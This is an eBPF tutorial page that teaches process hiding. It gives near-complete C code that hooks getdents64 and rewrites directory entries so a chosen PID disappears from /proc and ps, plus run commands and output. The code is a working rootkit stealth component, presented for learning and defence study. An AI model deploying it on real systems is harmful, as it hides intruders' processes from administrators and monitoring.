# eBPF Practical Tutorial: Hiding Process or File Information

eBPF (Extended Berkeley Packet Filter) is a powerful feature in the Linux kernel that allows you to run, load, and update user-defined code without having to change the kernel source code or reboot the kernel. This capability allows eBPF to be used in a wide range of applications such as network and system performance analysis, packet filtering, and security policies.

In this tutorial, we will show how eBPF can be used to hide process or file information, a common technique in the field of network security and defence.

## Background Knowledge and Implementation Mechanism

"Process hiding" enables a specific process to become invisible to the operating system's regular detection mechanisms. This technique can be used in both hacking and system defence scenarios. Specifically, each process on a Linux system has a subfolder named after its process ID in the /proc/ directory, which contains various information about the process. `ps` displays process information by looking in these folders. Therefore, if we can hide the /proc/ folder of a process, we can make that process invisible to `ps` commands and other detection methods.

The key to achieving process hiding is to manipulate the `/proc/` directory. In Linux, the `getdents64` system call can read the information of files in the directory. We can hide files by hooking into this system call and modifying the results it returns. To do this, you need to use eBPF's `bpf_probe_write_user` function, which can modify user-space memory, and therefore can be used to modify the results returned by `getdents64`.

In the following, we will describe in detail how to write eBPF programs in both kernel and user states to implement process hiding.

### Kernel eBPF Program Implementation

Next, we will describe in detail how to write eBPF program to implement process hiding in kernel state. The first part of the eBPF programme is the start:

```c
// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");
```

The first thing we need to do is to understand the basic structure of the eBPF programme and the important components that are used. The first few lines reference several important header files, such as "vmlinux.h", "bpf_helpers.h", "bpf_tracing.h" and "bpf_core_read.h". These files provide the infrastructure needed for eBPF programming and some important functions or macros.

- "vmlinux.h" is a header file containing the complete kernel data structures extracted from the vmlinux kernel binary. Using this header file, eBPF programs can access kernel data structures.
- The "bpf_helpers.h" header file defines a series of macros that encapsulate the BPF helper functions used by eBPF programs. These BPF helper functions are the main way that eBPF programs interact with the kernel.
- The "bpf_tracing.h" header file for tracing events contains a number of macros and functions designed to simplify the operation of tracepoints for eBPF programs.
- The "bpf_core_read.h" header file provides a set of macros and functions for reading data from the kernel.

The program defines a series of map structures, which are the main data structures in an eBPF program, and are used to share data between the kernel and the user, or to store and transfer data within the eBPF program.

Among them, "rb" is a map of type Ringbuffer, which is used to pass messages from the kernel to the userland; Ringbuffer is a data structure that can efficiently pass large amounts of data between the kernel and the userland.

"map_buffs" is a map of type Hash which is used to store buffer addresses for directory entries.

"map_bytes_read" is another Hash-type map that is used to enable searching in data loops.

"map_to_patch" is another Hash type map that stores the address of the directory entry (dentry) that needs to be modified.

"map_prog_array" is a map of type Prog Array, which is used to store the tail calls of a programme.

The "target_ppid" and "pid_to_hide_len" and "pid_to_hide" in the program are a few important global variables that store the PID of the target parent process, the length of the PID that needs to be hidden, and the PID that needs to be hidden, respectively.

In the next part of the code, the program defines a structure called "linux_dirent64", which represents a Linux directory entry. The program then defines two functions, "handle_getdents_enter" and "handle_getdents_exit", which are called at the entry and exit of the getdents64 system call, respectively, and are used to implement operations on the directory entry.

```c

// Optional Target Parent PID
const volatile int target_ppid = 0;

// These store the string representation
// of the PID to hide. This becomes the name
// of the folder in /proc/
const volatile int pid_to_hide_len = 0;
const volatile char pid_to_hide[MAX_PID_LEN];

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ }; 
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }
    int pid = pid_tgid >> 32;
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}
```

In this section of the code, we can see part of the implementation of the eBPF program that is responsible for the processing at the entry point of the `getdents64` system call.

We start by declaring a few global variables. The `target_ppid` represents the PID of the target parent we want to focus on, and if this value is 0, then we will focus on all processes. `pid_to_hide_len` and `pid_to_hide` are used to store the length of the PID of the process we want to hide from, and the PID itself, respectively. This PID is translated into the name of a folder in the `/proc/` directory, so the hidden process will not be visible in the `/proc/` directory.

Next, we declare a structure called `linux_dirent64`. This structure represents a Linux directory entry and contains metadata such as the inode number, the offset of the next directory entry, the length of the current directory entry, the file type, and the filename.

Then there is the prototype for the `getdents64` function. This function is a Linux system call that reads the contents of a directory. Our goal is to modify the directory entries during the execution of this function to enable process hiding.

The subsequent section is the concrete implementation of the eBPF program. We define a function called `handle_getdents_enter` at the entry point of the `getdents64` system call. This function first gets the PID and thread group ID of the current process, and then checks to see if it is the process we are interested in. If we set `target_ppid`, then we only focus on processes whose parent has a PID of `target_ppid`. If `target_ppid` is 0, we focus on all processes.

After confirming that the current process is the one we are interested in, we save the arguments to the `getdents64` system call into a map to be used when the system call returns. In particular, we focus on the second argument to the `getdents64` system call, which is a pointer to the `linux_dirent64` structure representing the contents of the directory to be read by the system call. We save this pointer, along with the current PID and thread group ID, as a key-value pair in the `map_buffs` map.

This completes the processing at the entry point of the `getdents64` system call. When the system call returns, we will modify the directory entry in the `handle_getdents_exit` function to hide the process.

In the next snippet, we will implement the handling at the return of the `getdents64` system call. Our main goal is to find the process we want to hide and modify the directory entry to hide it.

We start by defining a function called `handle_getdents_exit` that will be called when the `getdents64` system call returns.

```c

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // All of this is quite complex, but basically boils down to
    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
    // patching
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    for (int i = 0; i < 200; i ++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *)(buff_addr+bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++) {
            if (filename[j] != pid_to_hide[j]) {
                break;
            }
        }
        if (j == pid_to_hide_len) {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}

```

In this function, we first get the PID and thread group ID of the current process, and then check to see if the system call has read the contents of the directory. If it didn't read the contents, we just return.

Then we get the address of the directory contents saved at the entry point of the `getdents64` system call from the `map_buffs` map. If we haven't saved this address, then there's no need to do any further processing.

The next part is a bit more complicated, we use a loop to iteratively read the contents of the directory and check to see if we have the PID of the process we want to hide, and if we do, we use the `bpf_tail_call` function to jump to the `handle_getdents_patch` function to do the actual hiding.

```c
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}

```

In the `handle_getdents_patch` function, we first check to see if we have found the PID of the process we want to hide, and then we read the contents of the directory entry and modify the `d_reclen` field so that it overwrites the next directory entry, thus hiding our target process.

In this process, we use the functions `bpf_probe_read_user`, `bpf_probe_read_user_str`, and `bpf_probe_write_user` to read and write user-space data. This is because in kernel space, we can't access user space data directly and must use these special functions.

After we finish the hiding operation, we send an event to a ring buffer called `rb` indicating that we have successfully hidden a process. We reserve space in the buffer with the `bpf_ringbuf_reserve` function, then fill that space with the event's data, and finally commit the event to the buffer with the `bpf_ringbuf_submit` function.

Finally, we clean up the data previously saved in the map and return.

This code is a good example of process hiding in an eBPF environment. Through this example, we can see the rich features provided by eBPF, such as system call tracing, map storage, user-space data access, tail calls, and so on. These features allow us to implement complex logic in kernel space without modifying the kernel code.

## User-Style eBPF Programming

We perform the following operations in the userland eBPF program:

1. Open the eBPF program.
2. Set the PID of the process we want to hide.
3. Verify and load the eBPF program.
4. Wait for and process events sent by the eBPF program.

First, we open the eBPF application. This is done by calling the `pidhide_bpf__open` function. If this process fails, we simply return.

```c
    skel = pidhide_bpf__open();
    if (!skel)
    {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }
```

Next, we set the PIDs of the processes we want to hide, which is done by saving the PIDs to the `rodata` area of the eBPF program. By default, we hide the current process.

```c
    char pid_to_hide[10];
    if (env.pid_to_hide == 0)
    {
        env.pid_to_hide = getpid();
    }
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide) + 1;
    skel->rodata->target_ppid = env.target_ppid;
```

We then validate and load the eBPF program. This is done by calling the `pidhide_bpf__load` function. If this process fails, we perform a cleanup operation.

```c
    err = pidhide_bpf__load(skel);
    if (err)
    {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
```

Finally, we wait for and process events sent by the eBPF program. This process is achieved by calling the `ring_buffer__poll` function. During this process, we check the ring buffer every so often for new events. If there is, we call the `handle_event` function to handle the event.

```c
printf("Successfully started!\n");
printf("Hiding PID %d\n", env.pid_to_hide);
while (!exiting)
{
    err = ring_buffer__poll(rb, 100 /* timeout, ms */);
    /* Ctrl-C will cause -EINTR */
    if (err == -EINTR)
    {
        err = 0;
        break;
    }
    if (err < 0)
    {
        printf("Error polling perf buffer: %d\n", err);
        break;
    }
}
```

In the `handle_event` function, we print the appropriate message based on the content of the event. The arguments to this function include a context, the data of the event, and the size of the data. We first convert the event data into an `event` structure, then determine if the event successfully hides a process based on the `success` field, and finally print the corresponding message.

and then print the corresponding message.

```c
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}
```

This code shows how to use the eBPF programme to hide a process in the user state. We first open the eBPF application, then set the PID of the process we want to hide, then validate and load the eBPF application, and finally wait for and process the events sent by the eBPF application. This process makes use of some advanced features provided by eBPF, such as ring buffers and event handling, which allow us to easily interact with the kernel state eBPF program from the user state.

Full source code: https: [//github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/24-hide](https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/24-hide)

> The techniques shown in this paper are for proof of concept only and are intended for learning purposes only, and are not to be used in scenarios that do not comply with legal or regulatory requirements.

## Compile and Run

```bash
make
```

```sh
sudo ./pidhide --pid-to-hide 1534
```

```console
$ ps -aux | grep 1534
yunwei      1534  0.0  0.0 244540  6848 ?        Ssl  6月02   0:00 /usr/libexec/gvfs-mtp-volume-monitor
yunwei     32065  0.0  0.0  17712  2580 pts/1    S+   05:43   0:00 grep --color=auto 1534
```

```console
$ sudo ./pidhide --pid-to-hide 1534
Hiding PID 1534
Hid PID from program 31529 (ps)
Hid PID from program 31551 (ps)
Hid PID from program 31560 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31582 (ps)
Hid PID from program 31585 (bash)
Hid PID from program 31585 (bash)
Hid PID from program 31609 (bash)
Hid PID from program 31640 (ps)
Hid PID from program 31649 (ps)
```

```console
$ ps -aux | grep 1534
root       31523  0.1  0.0  22004  5616 pts/2    S+   05:42   0:00 sudo ./pidhide -p 1534
root       31524  0.0  0.0  22004   812 pts/3    Ss   05:42   0:00 sudo ./pidhide -p 1534
root       31525  0.3  0.0   3808  2456 pts/3    S+   05:42   0:00 ./pidhide -p 1534
yunwei     31583  0.0  0.0  17712  2612 pts/1    S+   05:42   0:00 grep --color=auto 1534
```

## Summary

You can also visit our tutorial code repository [at https://github.com/eunomia-bpf/bpf-developer-tutorial](https://github.com/eunomia-bpf/bpf-developer-tutorial) or our website [at https://eunomia.dev/zh/tutorials/](https://eunomia.dev/zh/tutorials/) for more examples and the full tutorial.

> The original link of this article: <https://eunomia.dev/tutorials/24-hide>
